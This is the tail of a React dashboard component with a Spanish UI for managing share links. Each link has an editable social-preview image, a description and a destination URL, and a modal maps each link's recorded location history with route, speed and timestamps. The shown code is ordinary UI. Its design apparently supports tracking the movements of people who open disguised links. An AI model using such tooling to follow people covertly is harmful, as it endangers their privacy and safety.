                                        </button>
                                        <button onClick={() => handleDeleteLink(link.id)} className="flex flex-col items-center gap-1 p-2 text-red-500 hover:bg-red-50 dark:hover:bg-red-900/20 rounded-lg flex-1">
                                            <span className="material-symbols-outlined text-[20px]">delete</span>
                                            <span className="text-[9px] font-bold">Borrar</span>
                                        </button>
                                    </div>
                                </div>
                            ))}
                        </div>

                        {links.length === 0 && <div className="p-12 text-center text-slate-500 italic">No tienes enlaces activos.</div>}
                    </div>
                )}
            </main>

            {editingLink && (
                <div className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
                    <div className="bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-2xl w-full max-w-lg overflow-hidden scale-in-center">
                        <div className="px-6 py-4 border-b border-slate-100 dark:border-slate-800 flex items-center justify-between">
                            <h3 className="text-lg font-bold dark:text-white">Editar Enlace</h3>
                            <button onClick={() => setEditingLink(null)} className="p-2 hover:bg-slate-100 rounded-full text-slate-500"><span className="material-symbols-outlined">close</span></button>
                        </div>
                        <form onSubmit={handleUpdateLink} className="p-6 flex flex-col gap-4">
                            <div className="flex flex-col gap-1.5">
                                <label className="text-xs font-bold text-slate-500 uppercase">Título</label>
                                <input type="text" value={editingLink.title} onChange={(e) => setEditingLink({ ...editingLink, title: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm  text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-primary/20" />
                            </div>
                            <div className="flex flex-col gap-1.5">
                                <label className="text-xs font-bold text-slate-500 uppercase">Descripción</label>
                                <textarea rows="3" value={editingLink.description || ''} onChange={(e) => setEditingLink({ ...editingLink, description: e.target.value })} className="w-full p-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm  text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-primary/20 resize-none" placeholder="Breve descripción para redes sociales..." />
                            </div>
                            <div className="flex flex-col gap-1.5">
                                <label className="text-xs font-bold text-slate-500 uppercase">URL de Imagen (Vista Previa)</label>
                                <input type="url" value={editingLink.imageUrl || ''} onChange={(e) => setEditingLink({ ...editingLink, imageUrl: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm  text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-primary/20" placeholder="https://..." />
                            </div>
                            <div className="flex flex-col gap-1.5">
                                <label className="text-xs font-bold text-slate-500 uppercase">URL de Destino</label>
                                <input type="url" value={editingLink.destinationUrl} onChange={(e) => setEditingLink({ ...editingLink, destinationUrl: e.target.value })} className="w-full h-11 px-4 rounded-xl bg-slate-50 dark:bg-slate-800 border dark:border-slate-800 text-sm  text-slate-900 dark:text-white outline-none focus:ring-2 focus:ring-primary/20" />
                            </div>
                            <div className="flex gap-3 mt-2">
                                <button type="button" onClick={() => setEditingLink(null)} className="flex-1 h-12 rounded-xl border border-slate-200 dark:border-slate-800 text-sm font-bold text-slate-600 dark:text-slate-300">Cancelar</button>
                                <button type="submit" className="flex-1 h-12 rounded-xl bg-primary text-white text-sm font-bold shadow-lg shadow-primary/25">Guardar</button>
                            </div>
                        </form>
                    </div>
                </div>
            )}

            {/* Custom Delete Confirmation Modal */}
            {deleteId && (
                <div className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
                    <div className="bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-2xl w-full max-w-sm overflow-hidden scale-in-center">
                        <div className="p-6 text-center">
                            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20 mb-4">
                                <span className="material-symbols-outlined text-3xl text-red-600">delete_forever</span>
                            </div>
                            <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-2">¿Estás seguro?</h3>
                            <p className="text-sm text-slate-500 dark:text-slate-400 mb-6">
                                ¿Estás seguro de que quieres eliminar este enlace? Esta acción es irreversible.
                            </p>
                            <div className="flex gap-3">
                                <button
                                    onClick={() => setDeleteId(null)}
                                    className="flex-1 h-11 rounded-xl border border-slate-200 dark:border-slate-800 text-sm font-bold text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 transition-colors"
                                >
                                    Cancelar
                                </button>
                                <button
                                    onClick={confirmDelete}
                                    className="flex-1 h-11 rounded-xl bg-red-600 text-white text-sm font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 transition-colors"
                                >
                                    Eliminar
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Custom Clear ALL Map Confirmation Modal */}
            {clearAllMap && (
                <div className="fixed inset-0 z-[999] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
                    <div className="bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-2xl w-full max-w-sm overflow-hidden scale-in-center">
                        <div className="p-6 text-center">
                            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20 mb-4">
                                <span className="material-symbols-outlined text-3xl text-red-600">delete_forever</span>
                            </div>
                            <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-2">¿Borrar Todo?</h3>
                            <p className="text-sm text-slate-500 dark:text-slate-400 mb-6">
                                ¿Estás seguro de que quieres borrar TODAS las ubicaciones del mapa? Esta acción no se puede deshacer.
                            </p>
                            <div className="flex gap-3">
                                <button
                                    onClick={() => setClearAllMap(false)}
                                    className="flex-1 h-11 rounded-xl border border-slate-200 dark:border-slate-800 text-sm font-bold text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 transition-colors"
                                >
                                    Cancelar
                                </button>
                                <button
                                    onClick={confirmClearAllMap}
                                    className="flex-1 h-11 rounded-xl bg-red-600 text-white text-sm font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 transition-colors"
                                >
                                    Borrar Todo
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Location History Modal */}
            {historyModal && (() => {
                // Compute route stats
                let totalDist = 0;
                const segmentDists = [0];
                for (let i = 1; i < historyData.length; i++) {
                    const d = haversineDistance(historyData[i - 1].lat, historyData[i - 1].lng, historyData[i].lat, historyData[i].lng);
                    totalDist += d;
                    segmentDists.push(d);
                }
                const totalTime = historyData.length > 1 ? new Date(historyData[historyData.length - 1].timestamp) - new Date(historyData[0].timestamp) : 0;
                const avgSpeed = totalTime > 0 ? (totalDist / 1000) / (totalTime / 3600000) : 0;

                return (
                <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
                    <div className="bg-white dark:bg-slate-900 rounded-2xl border border-slate-200 dark:border-slate-800 shadow-2xl w-full max-w-5xl max-h-[92vh] overflow-hidden flex flex-col">
                        {/* Header */}
                        <div className="px-6 py-4 border-b border-slate-100 dark:border-slate-800 flex items-center justify-between shrink-0">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-500 to-indigo-600 flex items-center justify-center">
                                    <span className="material-symbols-outlined text-white text-xl">route</span>
                                </div>
                                <div>
                                    <h3 className="text-lg font-bold dark:text-white">Historial de Recorrido</h3>
                                    <p className="text-xs text-slate-500">{historyModal.linkTitle}</p>
                                </div>
                            </div>
                            <button onClick={() => { setHistoryModal(null); setSelectedHistoryPoint(null); }} className="p-2 hover:bg-slate-100 dark:hover:bg-slate-800 rounded-full text-slate-500">
                                <span className="material-symbols-outlined">close</span>
                            </button>
                        </div>

                        {/* Date Filter */}
                        <div className="px-6 py-3 border-b border-slate-100 dark:border-slate-800 flex flex-wrap items-center gap-3 shrink-0">
                            <div className="flex items-center gap-2">
                                <label className="text-xs font-bold text-slate-500 uppercase">Desde</label>
                                <input
                                    type="date"
                                    value={historyDateFrom}
                                    onChange={(e) => setHistoryDateFrom(e.target.value)}
                                    className="h-9 px-3 rounded-lg bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-sm text-slate-900 dark:text-white outline-none"
                                />
                            </div>
                            <div className="flex items-center gap-2">
                                <label className="text-xs font-bold text-slate-500 uppercase">Hasta</label>
                                <input
                                    type="date"
                                    value={historyDateTo}
                                    onChange={(e) => setHistoryDateTo(e.target.value)}
                                    className="h-9 px-3 rounded-lg bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-sm text-slate-900 dark:text-white outline-none"
                                />
                            </div>
                            <button
                                onClick={handleHistoryFilter}
                                className="h-9 px-4 bg-purple-600 text-white text-sm font-bold rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-1"
                            >
                                <span className="material-symbols-outlined text-sm">search</span>
                                Buscar
                            </button>
                            <span className="text-xs text-slate-400 ml-auto">
                                {historyData.length} puntos encontrados
                            </span>
                        </div>

                        {/* Available Dates Quick Select */}
                        {historyDates.length > 0 && (
                            <div className="px-6 py-2 border-b border-slate-100 dark:border-slate-800 flex gap-2 overflow-x-auto shrink-0">
                                <span className="text-xs text-slate-400 font-bold shrink-0 py-1">Fechas:</span>
                                {historyDates.slice(0, 10).map(d => (
                                    <button
                                        key={d.date}
                                        onClick={() => {
                                            setHistoryDateFrom(d.date);
                                            setHistoryDateTo(d.date);
                                            setSelectedHistoryPoint(null);
                                            fetchHistory(historyModal.linkId, d.date, d.date);
                                        }}
                                        className={`shrink-0 px-3 py-1 rounded-full text-xs font-bold transition-colors ${
                                            historyDateFrom === d.date
                                                ? 'bg-purple-600 text-white'
                                                : 'bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-300 hover:bg-purple-100 dark:hover:bg-purple-900/20'
                                        }`}
                                    >
                                        {new Date(d.date + 'T12:00:00').toLocaleDateString('es', { day: 'numeric', month: 'short' })} ({d.count})
                                    </button>
                                ))}
                            </div>
                        )}

                        {/* Route Stats Bar */}
                        {historyData.length > 0 && (
                            <div className="px-6 py-3 border-b border-slate-100 dark:border-slate-800 flex flex-wrap gap-4 shrink-0 bg-slate-50/50 dark:bg-slate-800/30">
                                <div className="flex items-center gap-2">
                                    <span className="material-symbols-outlined text-purple-500 text-lg">straighten</span>
                                    <div>
                                        <p className="text-[10px] text-slate-400 uppercase font-bold">Distancia Total</p>
                                        <p className="text-sm font-bold text-slate-900 dark:text-white">{formatDistance(totalDist)}</p>
                                    </div>
                                </div>
                                <div className="flex items-center gap-2">
                                    <span className="material-symbols-outlined text-blue-500 text-lg">schedule</span>
                                    <div>
                                        <p className="text-[10px] text-slate-400 uppercase font-bold">Duración</p>
                                        <p className="text-sm font-bold text-slate-900 dark:text-white">{totalTime > 0 ? formatDuration(totalTime) : '—'}</p>
                                    </div>
                                </div>
                                <div className="flex items-center gap-2">
                                    <span className="material-symbols-outlined text-green-500 text-lg">speed</span>
                                    <div>
                                        <p className="text-[10px] text-slate-400 uppercase font-bold">Vel. Promedio</p>
                                        <p className="text-sm font-bold text-slate-900 dark:text-white">{avgSpeed > 0 ? `${avgSpeed.toFixed(1)} km/h` : '—'}</p>
                                    </div>
                                </div>
                                <div className="flex items-center gap-2">
                                    <span className="material-symbols-outlined text-orange-500 text-lg">pin_drop</span>
                                    <div>
                                        <p className="text-[10px] text-slate-400 uppercase font-bold">Puntos</p>
                                        <p className="text-sm font-bold text-slate-900 dark:text-white">{historyData.length}</p>
                                    </div>
                                </div>
                                {historyData.length > 0 && (
                                    <div className="flex items-center gap-2 ml-auto">
                                        <span className="material-symbols-outlined text-slate-400 text-lg">access_time</span>
                                        <div>
                                            <p className="text-[10px] text-slate-400 uppercase font-bold">Período</p>
                                            <p className="text-xs font-mono text-slate-600 dark:text-slate-300">
                                                {new Date(historyData[0].timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit' })}
                                                {' → '}
                                                {new Date(historyData[historyData.length - 1].timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit' })}
                                            </p>
                                        </div>
                                    </div>
                                )}
                            </div>
                        )}

                        {/* Content: Map + Timeline */}
                        <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
                            {/* Map */}
                            <div className="flex-1 min-h-[300px] relative">
                                {historyLoading && (
                                    <div className="absolute inset-0 z-10 bg-black/30 flex items-center justify-center">
                                        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-500"></div>
                                    </div>
                                )}
                                <MapContainer
                                    style={{ width: '100%', height: '100%' }}
                                    zoom={historyData.length > 0 ? 15 : 2}
                                    center={
                                        selectedHistoryPoint
                                            ? [selectedHistoryPoint.lat, selectedHistoryPoint.lng]
                                            : historyData.length > 0
                                                ? [historyData[0].lat, historyData[0].lng]
                                                : [center.lat, center.lng]
                                    }
                                >
                                    <MapLayers googleApiKey={import.meta.env.VITE_GOOGLE_MAPS_API_KEY} />
                                    <HistoryMapController data={historyData} selectedPoint={selectedHistoryPoint} />
                                    <HistoryMapRefSetter mapRef={historyMapRef} />
                                    {/* Gradient Route Polyline segments */}
                                    {historyData.length > 1 && historyData.map((point, idx) => {
                                        if (idx === 0) return null;
                                        const progress = idx / (historyData.length - 1);
                                        const r = Math.round(34 + progress * (239 - 34));
                                        const g = Math.round(197 + progress * (68 - 197));
                                        const b = Math.round(94 + progress * (68 - 94));
                                        const color = `rgb(${r},${g},${b})`;
                                        return (
                                            <Polyline
                                                key={`seg-${idx}`}
                                                positions={[
                                                    [historyData[idx - 1].lat, historyData[idx - 1].lng],
                                                    [point.lat, point.lng]
                                                ]}
                                                pathOptions={{ color: color, weight: 4, opacity: 0.9 }}
                                            />
                                        );
                                    })}

                                    {/* Direction arrows on history route */}
                                    {historyData.length > 1 && historyData.map((point, idx) => {
                                        if (idx === 0) return null;
                                        const prev = historyData[idx - 1];
                                        const bearing = getBearing(prev.lat, prev.lng, point.lat, point.lng);
                                        const midLat = (prev.lat + point.lat) / 2;
                                        const midLng = (prev.lng + point.lng) / 2;
                                        const progress = idx / (historyData.length - 1);
                                        const r = Math.round(34 + progress * (239 - 34));
                                        const g = Math.round(197 + progress * (68 - 197));
                                        const b = Math.round(94 + progress * (68 - 94));
                                        const color = `rgb(${r},${g},${b})`;
                                        return (
                                            <Marker
                                                key={`hist-arrow-${idx}`}
                                                position={[midLat, midLng]}
                                                icon={createArrowIcon(bearing, color)}
                                                interactive={false}
                                            />
                                        );
                                    })}

                                    {/* Start Marker - Green */}
                                    {historyData.length > 0 && (
                                        <Marker
                                            position={[historyData[0].lat, historyData[0].lng]}
                                            icon={createHistoryIcon('#22c55e', 'A')}
                                            title="Inicio del recorrido"
                                            eventHandlers={{ click: () => setSelectedHistoryPoint(historyData[0]) }}
                                        >
                                            {selectedHistoryPoint === historyData[0] && (
                                                <Popup eventHandlers={{ popupclose: () => setSelectedHistoryPoint(null) }}>
                                                    <div style={{ padding: '4px 2px', minWidth: 140 }}>
                                                        <p style={{ fontWeight: 'bold', fontSize: 12, marginBottom: 4 }}>
                                                            Punto #{historyData.indexOf(selectedHistoryPoint) + 1}
                                                        </p>
                                                        <p style={{ fontSize: 11, color: '#666', fontFamily: 'monospace' }}>
                                                            {selectedHistoryPoint.lat.toFixed(6)}, {selectedHistoryPoint.lng.toFixed(6)}
                                                        </p>
                                                        <p style={{ fontSize: 11, color: '#888', marginTop: 2 }}>
                                                            {new Date(selectedHistoryPoint.timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                                        </p>
                                                        {historyData.indexOf(selectedHistoryPoint) > 0 && (
                                                            <p style={{ fontSize: 11, color: '#8b5cf6', marginTop: 2, fontWeight: 600 }}>
                                                                +{formatDistance(segmentDists[historyData.indexOf(selectedHistoryPoint)])} desde anterior
                                                            </p>
                                                        )}
                                                    </div>
                                                </Popup>
                                            )}
                                        </Marker>
                                    )}
                                    {/* End Marker - Red */}
                                    {historyData.length > 1 && (
                                        <Marker
                                            position={[historyData[historyData.length - 1].lat, historyData[historyData.length - 1].lng]}
                                            icon={createHistoryIcon('#ef4444', 'B')}
                                            title="Fin del recorrido"
                                            eventHandlers={{ click: () => setSelectedHistoryPoint(historyData[historyData.length - 1]) }}
                                        >
                                            {selectedHistoryPoint === historyData[historyData.length - 1] && (
                                                <Popup eventHandlers={{ popupclose: () => setSelectedHistoryPoint(null) }}>
                                                    <div style={{ padding: '4px 2px', minWidth: 140 }}>
                                                        <p style={{ fontWeight: 'bold', fontSize: 12, marginBottom: 4 }}>
                                                            Punto #{historyData.indexOf(selectedHistoryPoint) + 1}
                                                        </p>
                                                        <p style={{ fontSize: 11, color: '#666', fontFamily: 'monospace' }}>
                                                            {selectedHistoryPoint.lat.toFixed(6)}, {selectedHistoryPoint.lng.toFixed(6)}
                                                        </p>
                                                        <p style={{ fontSize: 11, color: '#888', marginTop: 2 }}>
                                                            {new Date(selectedHistoryPoint.timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                                        </p>
                                                        {historyData.indexOf(selectedHistoryPoint) > 0 && (
                                                            <p style={{ fontSize: 11, color: '#8b5cf6', marginTop: 2, fontWeight: 600 }}>
                                                                +{formatDistance(segmentDists[historyData.indexOf(selectedHistoryPoint)])} desde anterior
                                                            </p>
                                                        )}
                                                    </div>
                                                </Popup>
                                            )}
                                        </Marker>
                                    )}

                                    {/* Selected point marker */}
                                    {selectedHistoryPoint && selectedHistoryPoint !== historyData[0] && selectedHistoryPoint !== historyData[historyData.length - 1] && (
                                        <Marker
                                            position={[selectedHistoryPoint.lat, selectedHistoryPoint.lng]}
                                            icon={createHistoryIcon('#f59e0b', '●')}
                                        >
                                            <Popup eventHandlers={{ popupclose: () => setSelectedHistoryPoint(null) }}>
                                                <div style={{ padding: '4px 2px', minWidth: 140 }}>
                                                    <p style={{ fontWeight: 'bold', fontSize: 12, marginBottom: 4 }}>
                                                        Punto #{historyData.indexOf(selectedHistoryPoint) + 1}
                                                    </p>
                                                    <p style={{ fontSize: 11, color: '#666', fontFamily: 'monospace' }}>
                                                        {selectedHistoryPoint.lat.toFixed(6)}, {selectedHistoryPoint.lng.toFixed(6)}
                                                    </p>
                                                    <p style={{ fontSize: 11, color: '#888', marginTop: 2 }}>
                                                        {new Date(selectedHistoryPoint.timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                                    </p>
                                                    {historyData.indexOf(selectedHistoryPoint) > 0 && (
                                                        <p style={{ fontSize: 11, color: '#8b5cf6', marginTop: 2, fontWeight: 600 }}>
                                                            +{formatDistance(segmentDists[historyData.indexOf(selectedHistoryPoint)])} desde anterior
                                                        </p>
                                                    )}
                                                </div>
                                            </Popup>
                                        </Marker>
                                    )}
                                </MapContainer>

                                {/* Map Legend */}
                                {historyData.length > 0 && (
                                    <div className="absolute bottom-3 left-3 bg-black/70 backdrop-blur-sm rounded-lg px-3 py-2 flex items-center gap-3 text-[10px] text-white font-bold">
                                        <span className="flex items-center gap-1"><span className="w-3 h-3 rounded-full bg-green-500 border border-white"></span> Inicio</span>
                                        <span className="flex items-center gap-1"><span className="w-3 h-3 rounded-full bg-red-500 border border-white"></span> Fin</span>
                                        <span className="flex items-center gap-1"><span className="w-6 h-0.5 bg-gradient-to-r from-green-500 via-purple-500 to-red-500 rounded"></span> Ruta</span>
                                    </div>
                                )}
                            </div>

                            {/* Timeline List */}
                            <div className="w-full md:w-80 border-t md:border-t-0 md:border-l border-slate-100 dark:border-slate-800 overflow-y-auto max-h-[250px] md:max-h-full">
                                <div className="p-3">
                                    <h4 className="text-xs font-bold text-slate-500 uppercase mb-3 flex items-center gap-1">
                                        <span className="material-symbols-outlined text-sm">timeline</span>
                                        Recorrido detallado
                                    </h4>
                                    {historyData.length === 0 && !historyLoading && (
                                        <div className="py-8 text-center">
                                            <span className="material-symbols-outlined text-3xl text-slate-300 dark:text-slate-600">location_off</span>
                                            <p className="text-xs text-slate-400 italic mt-2">No hay datos para esta fecha</p>
                                        </div>
                                    )}
                                    <div className="relative">
                                        {/* Vertical connector line */}
                                        {historyData.length > 1 && (
                                            <div className="absolute left-[11px] top-3 bottom-3 w-[2px] bg-gradient-to-b from-green-500 via-purple-500 to-red-500 rounded-full"></div>
                                        )}
                                        <div className="space-y-0">
                                            {historyData.map((point, idx) => {
                                                const isFirst = idx === 0;
                                                const isLast = idx === historyData.length - 1;
                                                const isSelected = selectedHistoryPoint === point;
                                                const timeDiff = idx > 0 ? new Date(point.timestamp) - new Date(historyData[idx - 1].timestamp) : 0;
                                                return (
                                                    <div
                                                        key={point.id}
                                                        className={`flex items-start gap-3 px-2 py-2 rounded-lg cursor-pointer transition-all relative ${
                                                            isSelected
                                                                ? 'bg-purple-50 dark:bg-purple-900/20 ring-1 ring-purple-300 dark:ring-purple-700'
                                                                : 'hover:bg-slate-50 dark:hover:bg-slate-800/50'
                                                        }`}
                                                        onClick={() => {
                                                            setSelectedHistoryPoint(point);
                                                            if (historyMapRef.current) {
                                                                historyMapRef.current.panTo({ lat: point.lat, lng: point.lng });
                                                                historyMapRef.current.setZoom(17);
                                                            }
                                                        }}
                                                    >
                                                        {/* Dot indicator */}
                                                        <div className="relative z-10 shrink-0 mt-0.5">
                                                            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[9px] font-bold border-2 ${
                                                                isFirst ? 'bg-green-500 border-green-300 text-white'
                                                                : isLast ? 'bg-red-500 border-red-300 text-white'
                                                                : isSelected ? 'bg-amber-500 border-amber-300 text-white'
                                                                : 'bg-purple-500/80 border-purple-300/50 text-white'
                                                            }`}>
                                                                {isFirst ? 'A' : isLast ? 'B' : idx}
                                                            </div>
                                                        </div>
                                                        {/* Content */}
                                                        <div className="min-w-0 flex-1">
                                                            <div className="flex items-center justify-between gap-2">
                                                                <p className="text-[11px] font-mono text-slate-700 dark:text-slate-200 truncate">
                                                                    {point.lat.toFixed(6)}, {point.lng.toFixed(6)}
                                                                </p>
                                                                <span className="text-[10px] font-bold text-slate-400 shrink-0">
                                                                    {new Date(point.timestamp).toLocaleTimeString('es', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                                                </span>
                                                            </div>
                                                            {idx > 0 && (
                                                                <div className="flex items-center gap-2 mt-0.5">
                                                                    <span className="text-[10px] text-purple-500 font-semibold">
                                                                        +{formatDistance(segmentDists[idx])}
                                                                    </span>
                                                                    {timeDiff > 0 && (
                                                                        <span className="text-[10px] text-slate-400">
                                                                            · {formatDuration(timeDiff)}
                                                                        </span>
                                                                    )}
                                                                </div>
                                                            )}
                                                            {isFirst && (
                                                                <span className="text-[10px] text-green-600 font-bold">Punto de inicio</span>
                                                            )}
                                                            {isLast && historyData.length > 1 && (
                                                                <span className="text-[10px] text-red-500 font-bold">Último punto · {formatDistance(totalDist)} total</span>
                                                            )}
                                                        </div>
                                                    </div>
                                                );
                                            })}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                );
            })()}

            {/* Mobile Bottom Navigation - must be LAST in DOM so it's on top */}
            <nav className="md:hidden fixed bottom-0 left-0 w-full bg-white dark:bg-slate-900 border-t border-slate-200 dark:border-slate-800 flex justify-around items-center p-2 pb-safe z-50 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)]">
                <button onClick={() => setActiveTab('overview')} className={`flex flex-col items-center p-2 rounded-lg ${activeTab === 'overview' ? 'text-primary' : 'text-slate-500 dark:text-slate-400'}`}>
                    <span className="material-symbols-outlined" style={activeTab === 'overview' ? { fontVariationSettings: "'FILL' 1" } : {}}>dashboard</span>
                    <span className="text-[10px] font-medium mt-0.5">Inicio</span>
                </button>
                <button onClick={() => setActiveTab('map')} className={`flex flex-col items-center p-2 rounded-lg ${activeTab === 'map' ? 'text-primary' : 'text-slate-500 dark:text-slate-400'}`}>
                    <span className="material-symbols-outlined" style={activeTab === 'map' ? { fontVariationSettings: "'FILL' 1" } : {}}>location_on</span>
                    <span className="text-[10px] font-medium mt-0.5">Mapa</span>
                </button>
                <button
                    onClick={() => setActiveTab('create')}
                    className="flex items-center justify-center w-14 h-14 -mt-8 bg-primary text-white rounded-full shadow-lg shadow-primary/40 active:scale-95 transition-transform"
                >
                    <span className="material-symbols-outlined text-2xl">add</span>
                </button>
                <button onClick={() => setActiveTab('links')} className={`flex flex-col items-center p-2 rounded-lg ${activeTab === 'links' ? 'text-primary' : 'text-slate-500 dark:text-slate-400'}`}>
                    <span className="material-symbols-outlined" style={activeTab === 'links' ? { fontVariationSettings: "'FILL' 1" } : {}}>link</span>
                    <span className="text-[10px] font-medium mt-0.5">Enlaces</span>
                </button>
                <button onClick={() => setActiveTab('profile')} className={`flex flex-col items-center p-2 rounded-lg ${activeTab === 'profile' ? 'text-primary' : 'text-slate-500 dark:text-slate-400'}`}>
                    <span className="material-symbols-outlined" style={activeTab === 'profile' ? { fontVariationSettings: "'FILL' 1" } : {}}>person</span>
                    <span className="text-[10px] font-medium mt-0.5">Perfil</span>
                </button>
            </nav>
        </div>
    );
};

export default UserDashboard;
